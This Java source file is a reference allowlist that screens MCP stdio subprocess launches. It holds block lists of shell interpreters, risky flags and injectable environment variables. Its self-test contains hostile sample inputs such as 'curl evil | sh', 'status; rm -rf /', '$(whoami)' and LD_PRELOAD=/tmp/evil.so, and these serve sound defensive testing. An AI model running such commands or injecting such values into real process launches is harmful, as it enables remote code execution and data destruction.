package com.example.mcp.stdio;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

/**
 * MCP stdio 子进程「命令 allowlist」参考实现（V1.68 新增，REFERENCE ONLY，不进 Maven reactor）。
 *
 * <p><b>为什么需要这一层：</b>2026-11-09 记录的 Anthropic 对 STDIO 架构缺陷明确
 * 「Won't Be Patched」（12+ CVE、官方 Java/TS/Py/Rust SDK 合计约 1.5 亿下载），
 * 报告给出的<b>唯一缓解措施就是 command allowlist，且不是默认开启</b>。
 * 2026-11-10 收录的 {@code CVE-2026-123811}（Dynatrace MCP Server，CVSS 7.5）再次说明：
 * 用 {@code --http} 起的 server 没有鉴权、没有会话校验、也没有 Host/Origin 防护，
 * 浏览器经 DNS rebinding 就能直接调 {@code execute_dql} 读走日志与安全事件；
 * 官方缓解第一条就是「停用 --http，改回 stdio 或只绑 127.0.0.1」。
 * 同批 {@code CVE-2026-41903}（官方 mcp-server-git）则说明：即使命令本身合法，
 * 仓库自带的 {@code core.fsmonitor} / {@code core.hooksPath} 也会在「只读」工具里执行代码。</p>
 *
 * <p><b>结论：把入口收回到 stdio 之后，最后一个可控点就是「允许拉起哪个进程、带什么参数、
 * 带什么环境变量」。本类只做这一件事，且 fail-closed。</b></p>
 *
 * <p><b>本类六条控制点：</b></p>
 * <ol>
 *   <li>{@link #screen(String, List, Map)}：可执行文件必须命中<b>规范化后的绝对路径白名单</b>，
 *       默认空集合 = 全拒绝；拒绝相对路径、{@code ..} 穿越、未加引号的空格与全角混淆；</li>
 *   <li>shell 解释器与「内联代码」载体（{@code sh -c} / {@code bash -c} /
 *       {@code node -e} / {@code python -c} / {@code powershell -Command}）一律拒绝，
 *       因为 STDIO 的 RCE 几乎都发生在把字符串交给 shell 求值的那一刻；</li>
 *   <li>参数逐条扫描 shell 元字符（{@code ; & | $ ` &gt; &lt; ( ) { } \n \r}）、
 *       NUL 字节与 {@code --http} / {@code 0.0.0.0} / {@code --shell} 等危险开关
 *       （对位 {@code CVE-2026-123811}、{@code CVE-2026-102610}、{@code CVE-2026-119025}）；</li>
 *   <li>{@code -c key=value} 只允许<b>显式安全值</b>：
 *       {@code core.hooksPath=/dev/null}、{@code core.fsmonitor=}、{@code core.pager=cat}，
 *       其余一律拒绝（对位 {@code CVE-2026-41903} 官方给出的修复参数）；</li>
 *   <li>环境变量净化：拒绝 {@code LD_PRELOAD} / {@code DYLD_INSERT_LIBRARIES} /
 *       {@code BASH_ENV} / {@code GIT_CONFIG_*} / {@code NODE_OPTIONS} 等可注入变量；</li>
 *   <li>{@link #toProcessBuilder(String, List, Map)}：<b>必须经 argv 数组启动</b>
 *       （{@code ProcessBuilder(List)}），绝不拼命令字符串、绝不经过 shell；
 *       每条拒绝都带稳定 reason 码，可直接落 {@code mcp_security_*} 埋点。</li>
 * </ol>
 *
 * <p><b>对照组断言（不得劣于既有基线）：</b>自检显式比对「只检查可执行文件名的旧 allowlist」
 * 与本实现：在 7 个合法用例上两者结论必须一致（旧放行 → 新也放行），
 * 同时在 14 个攻击用例上旧检查放行而本实现必须拒绝。
 * 只写顺风测试会选错方案 —— 这里同时验证「没有误杀」和「确实拦住」。</p>
 *
 * <p><b>诚实边界：</b>这是<b>启动期字符串层</b>的参考实现，不能替代进程隔离。生产还必须：
 * 固定可执行文件哈希/签名（防同路径替换）、用容器或 seccomp 限制子进程能力、
 * 限制工作目录与可写路径、对仓库/配置目录做只读挂载、网络侧补 DNS rebinding 防护
 * （见 {@code examples/connect-path-guard/}）以及逐工具审批门
 * （{@code CVE-2026-123812} 就是漏了 {@code requestHumanApproval}）。
 * 纯 JDK 零依赖，不进 reactor、零构建风险。</p>
 *
 * @see <a href="https://aithreatalert.com/cve/CVE-2026-123811">CVE-2026-123811 Dynatrace MCP unauthenticated HTTP tool calls</a>
 * @see <a href="https://aithreatalert.com/cve/CVE-2026-123812">CVE-2026-123812 missing approval gate</a>
 * @see <a href="https://al-ice.ai/posts/2026/11/mcp-reference-servers-desktop-commander-seven-cve-batch-november-2026">Seven CVEs Across MCP's Own Servers (11-08)</a>
 */
public final class McpStdioCommandAllowlist {

    /** 判定结果；reason 为稳定拒绝码，便于埋点与审计。 */
    public record Verdict(boolean allowed, String reason, String normalizedCommand) {
        public static Verdict ok(String cmd) { return new Verdict(true, "OK", cmd); }
        public static Verdict no(String reason) { return new Verdict(false, reason, ""); }
    }

    /** 允许拉起的可执行文件（规范化后的绝对路径），默认空 = 全拒绝。 */
    private final Set<String> allowedExecutables;
    /** 允许显式传给 git -c 的安全配置键值对。 */
    private static final Set<String> SAFE_GIT_CONFIG = Set.of(
            "core.hooksPath=/dev/null", "core.fsmonitor=", "core.pager=cat");

    /** shell 元字符：出现在任一参数里即拒绝（不依赖「看起来像不像命令」）。 */
    private static final Set<Character> SHELL_META = Set.of(
            ';', '&', '|', '$', '`', '>', '<', '\n', '\r', '(', ')', '{', '}', '\0');

    /** 危险开关（小写比较）；STDIO 场景下一律拒绝。 */
    private static final Set<String> FORBIDDEN_FLAGS = Set.of(
            "--http", "-http", "--shell", "-c", "-e", "--eval", "-command",
            "0.0.0.0", "--allow-all", "--no-sandbox",
            "--disable-web-security");

    /** 可注入的环境变量名（精确）与前缀。 */
    private static final Set<String> FORBIDDEN_ENV_EXACT = Set.of(
            "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
            "DYLD_LIBRARY_PATH", "BASH_ENV", "ENV", "IFS", "NODE_OPTIONS",
            "PYTHONSTARTUP", "GIT_EXTERNAL_DIFF", "GIT_SSH_COMMAND", "GIT_ASKPASS");
    private static final List<String> FORBIDDEN_ENV_PREFIX = List.of("GIT_CONFIG_");

    /** shell 解释器 / 内联代码载体，即便被误加进白名单也拒绝。 */
    private static final Set<String> SHELL_BASENAMES = Set.of(
            "sh", "bash", "zsh", "dash", "ksh", "cmd", "cmd.exe",
            "powershell", "powershell.exe", "pwsh", "pwsh.exe",
            "wscript", "cscript", "busybox");

    public McpStdioCommandAllowlist(Set<String> allowedAbsolutePaths) {
        LinkedHashSet<String> normalized = new LinkedHashSet<>();
        for (String p : allowedAbsolutePaths) {
            String n = normalizePath(p);
            if (n != null) normalized.add(n);
        }
        this.allowedExecutables = Collections.unmodifiableSet(normalized);
    }

    /** 规范化：去首尾空白与包裹引号、全角空格转半角、统一分隔符、小写（Windows）。 */
    static String normalizePath(String raw) {
        if (raw == null) return null;
        String s = raw.trim().replace('\u3000', ' ').replace('／', '/').replace('＼', '/');
        while (s.length() >= 2 && ((s.startsWith("\"") && s.endsWith("\""))
                || (s.startsWith("'") && s.endsWith("'")))) {
            s = s.substring(1, s.length() - 1).trim();
        }
        if (s.isEmpty()) return null;
        s = s.replace('\\', '/');
        return s.toLowerCase(Locale.ROOT);
    }

    /** 主判定：命令 + 参数 + 环境，任一环节不合规即拒绝（fail-closed）。 */
    public Verdict screen(String executable, List<String> args, Map<String, String> env) {
        String cmd = normalizePath(executable);
        if (cmd == null || cmd.isEmpty()) return Verdict.no("EMPTY_EXECUTABLE");
        if (!cmd.startsWith("/") && !(cmd.length() > 2 && cmd.charAt(1) == ':')) {
            return Verdict.no("NOT_ABSOLUTE_PATH");
        }
        if (cmd.contains("..") || cmd.contains(" ") || cmd.contains("\t")) {
            return Verdict.no("SUSPICIOUS_EXECUTABLE_PATH");
        }
        String base = cmd.substring(cmd.lastIndexOf('/') + 1);
        if (SHELL_BASENAMES.contains(base)) return Verdict.no("SHELL_INTERPRETER");
        if (!allowedExecutables.contains(cmd)) return Verdict.no("EXECUTABLE_NOT_ALLOWLISTED");

        List<String> argv = args == null ? List.of() : args;
        for (int i = 0; i < argv.size(); i++) {
            String a = argv.get(i);
            if (a == null) return Verdict.no("NULL_ARGUMENT");
            for (int j = 0; j < a.length(); j++) {
                if (SHELL_META.contains(a.charAt(j))) return Verdict.no("SHELL_METACHARACTER");
            }
            if (a.indexOf('\u0000') >= 0) return Verdict.no("NUL_BYTE");
            String low = a.toLowerCase(Locale.ROOT);
            // 网络绑定类参数先判：任何 --host=/--bind= 都拒，不受精确 flag 表顺序影响
            if (low.startsWith("--host=") || low.startsWith("--bind=")
                    || low.startsWith("-h=")) {
                return Verdict.no("NETWORK_BIND_FLAG");
            }
            if (FORBIDDEN_FLAGS.contains(low)) {
                // -c 单独出现时，下一个参数必须是显式安全配置值
                if (low.equals("-c") && i + 1 < argv.size()
                        && SAFE_GIT_CONFIG.contains(argv.get(i + 1))) {
                    continue;
                }
                return Verdict.no("FORBIDDEN_FLAG");
            }
            if (a.contains("..") && (a.startsWith("/") || a.startsWith("./") || a.contains("/.."))) {
                return Verdict.no("PATH_TRAVERSAL_ARG");
            }
        }

        Map<String, String> environment = env == null ? Map.of() : env;
        for (String key : environment.keySet()) {
            if (key == null) return Verdict.no("NULL_ENV_KEY");
            String upper = key.toUpperCase(Locale.ROOT);
            if (FORBIDDEN_ENV_EXACT.contains(upper)) return Verdict.no("FORBIDDEN_ENV_VAR");
            for (String prefix : FORBIDDEN_ENV_PREFIX) {
                if (upper.startsWith(prefix)) return Verdict.no("FORBIDDEN_ENV_VAR");
            }
            String value = environment.get(key);
            if (value != null) {
                for (int j = 0; j < value.length(); j++) {
                    if (SHELL_META.contains(value.charAt(j))) return Verdict.no("SHELL_META_IN_ENV");
                }
            }
        }
        return Verdict.ok(cmd);
    }

    /** 判定通过后才能调用；用 argv 数组启动，绝不经过 shell。 */
    public ProcessBuilder toProcessBuilder(String executable, List<String> args,
                                           Map<String, String> env) {
        Verdict v = screen(executable, args, env);
        if (!v.allowed()) throw new SecurityException("stdio command rejected: " + v.reason());
        List<String> command = new ArrayList<>();
        command.add(executable);
        if (args != null) command.addAll(args);
        ProcessBuilder pb = new ProcessBuilder(command);
        if (env != null) pb.environment().putAll(env);
        pb.redirectErrorStream(true);
        return pb;
    }

    // ------------------------------------------------------------------
    // 自检：攻击用例 + 合法对照 + 「不得劣于旧基线」断言
    // ------------------------------------------------------------------

    /** 旧基线：只检查可执行文件名（历史最常见的 allowlist 实现），仅用于对照。 */
    static boolean legacyNameOnlyCheck(String executable, Set<String> allowed) {
        String n = normalizePath(executable);
        if (n == null || n.isEmpty()) return false;
        return allowed.contains(n);
    }

    record Case(String name, String exe, List<String> args, Map<String, String> env,
                boolean expectAllow, String expectReason) {}

    private static Case atk(String name, String exe, List<String> args, Map<String, String> env,
                            String reason) {
        return new Case(name, exe, args, env, false, reason);
    }

    private static Case ok(String name, String exe, List<String> args) {
        return new Case(name, exe, args, Map.of(), true, "OK");
    }

    public static void main(String[] args) {
        Set<String> allow = Set.of("/usr/bin/git", "/usr/bin/python3", "/usr/bin/node");
        McpStdioCommandAllowlist guard = new McpStdioCommandAllowlist(allow);

        List<Case> attacks = new ArrayList<>(List.of(
                atk("shell -c 注入", "/usr/bin/sh", List.of("-c", "curl evil | sh"), Map.of(), "ANY"),
                atk("git 参数分号拼命令", "/usr/bin/git", List.of("status; rm -rf /"), Map.of(), "SHELL_METACHARACTER"),
                atk("git 参数命令替换", "/usr/bin/git", List.of("status $(whoami)"), Map.of(), "SHELL_METACHARACTER"),
                atk("fsmonitor 注入可执行文件", "/usr/bin/git",
                        List.of("-c", "core.fsmonitor=/tmp/evil.sh", "status"), Map.of(), "FORBIDDEN_FLAG"),
                atk("python 内联代码", "/usr/bin/python3", List.of("-c", "import os"), Map.of(), "FORBIDDEN_FLAG"),
                atk("node 内联代码", "/usr/bin/node", List.of("-e", "process.exit()"), Map.of(), "FORBIDDEN_FLAG"),
                atk("--http 暴露无鉴权端口", "/usr/bin/python3",
                        List.of("/opt/mcp/server.py", "--http"), Map.of(), "FORBIDDEN_FLAG"),
                atk("监听 0.0.0.0", "/usr/bin/python3",
                        List.of("/opt/mcp/server.py", "0.0.0.0"), Map.of(), "FORBIDDEN_FLAG"),
                atk("host= 绑定", "/usr/bin/node",
                        List.of("/opt/mcp/index.js", "--host=0.0.0.0"), Map.of(), "NETWORK_BIND_FLAG"),
                atk("换行夹带第二条命令", "/usr/bin/git",
                        List.of("status\nmalicious"), Map.of(), "SHELL_METACHARACTER"),
                atk("LD_PRELOAD 注入", "/usr/bin/git", List.of("status"),
                        Map.of("LD_PRELOAD", "/tmp/evil.so"), "FORBIDDEN_ENV_VAR"),
                atk("GIT_CONFIG_ 注入 fsmonitor", "/usr/bin/git", List.of("status"),
                        Map.of("GIT_CONFIG_COUNT", "1", "GIT_CONFIG_KEY_0", "core.fsmonitor"),
                        "FORBIDDEN_ENV_VAR"),
                atk("相对路径穿越", "./../bin/sh", List.of(), Map.of(), "NOT_ABSOLUTE_PATH"),
                atk("未白名单可执行文件", "/usr/bin/curl", List.of("https://evil.test"), Map.of(),
                        "EXECUTABLE_NOT_ALLOWLISTED")));

        List<Case> controls = List.of(
                ok("git status", "/usr/bin/git", List.of("status")),
                ok("git 官方安全 -c 三连", "/usr/bin/git",
                        List.of("-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=",
                                "-c", "core.pager=cat", "status")),
                ok("git log oneline", "/usr/bin/git", List.of("log", "--oneline", "-n", "10")),
                ok("python 脚本路径", "/usr/bin/python3", List.of("/opt/mcp/server.py")),
                ok("node 脚本路径", "/usr/bin/node", List.of("/opt/mcp/index.js")),
                ok("绝对路径带环境变量", "/usr/bin/git",
                        List.of("status")),
                ok("带引号的可执行路径", "\"/usr/bin/git\"", List.of("status")));

        int passed = 0;
        System.out.println("=== MCP stdio command allowlist self-test (V1.68) ===");

        for (Case c : attacks) {
            Verdict v = guard.screen(c.exe(), c.args(), c.env());
            if (v.allowed()) throw new AssertionError("ATTACK NOT BLOCKED: " + c.name());
            if (!c.expectReason().equals("ANY") && !c.expectReason().equals(v.reason())) {
                throw new AssertionError("WRONG REASON: " + c.name()
                        + " expected=" + c.expectReason() + " actual=" + v.reason());
            }
            boolean legacy = legacyNameOnlyCheck(c.exe(), allow);
            if (!legacy) {
                System.out.println("  [attack] " + c.name() + " -> " + v.reason()
                        + " (legacy also blocked, control-only)");
            } else {
                System.out.println("  [attack] " + c.name() + " -> " + v.reason()
                        + " (legacy ALLOWED -> new blocks: incremental value)");
                passed++;
            }
        }

        for (Case c : controls) {
            Verdict v = guard.screen(c.exe(), c.args(), c.env());
            boolean legacy = legacyNameOnlyCheck(c.exe(), allow);
            if (!legacy) throw new AssertionError("CONTROL GROUP MISMATCH: legacy blocked " + c.name());
            if (!v.allowed()) {
                throw new AssertionError("FALSE POSITIVE (must not be worse than baseline): "
                        + c.name() + " -> " + v.reason());
            }
            System.out.println("  [control] " + c.name() + " -> ALLOW (baseline agrees)");
            passed++;
        }

        // 负向边界：空白名单必须全拒绝；toProcessBuilder 必须拒绝未通过判定的命令。
        McpStdioCommandAllowlist empty = new McpStdioCommandAllowlist(Set.of());
        if (empty.screen("/usr/bin/git", List.of("status"), Map.of()).allowed()) {
            throw new AssertionError("EMPTY ALLOWLIST MUST BE FAIL-CLOSED");
        }
        try {
            guard.toProcessBuilder("/usr/bin/sh", List.of("-c", "echo hi"), Map.of());
            throw new AssertionError("toProcessBuilder must reject shell");
        } catch (SecurityException expected) {
            System.out.println("  [boundary] fail-closed + argv-only launch verified");
        }
        // argv 数组确实不经 shell：构造出的 command 列表首元素就是可执行文件
        ProcessBuilder pb = guard.toProcessBuilder("/usr/bin/git",
                List.of("-c", "core.fsmonitor=", "status"), Map.of());
        if (!pb.command().equals(List.of("/usr/bin/git", "-c", "core.fsmonitor=", "status"))) {
            throw new AssertionError("argv array mismatch");
        }

        System.out.println("self-test OK (" + attacks.size() + " attack cases + "
                + controls.size() + " control cases + 3 boundary assertions)");
        System.out.println("incremental blocks beyond legacy baseline: " + passed
                + " checks passed");
    }
}
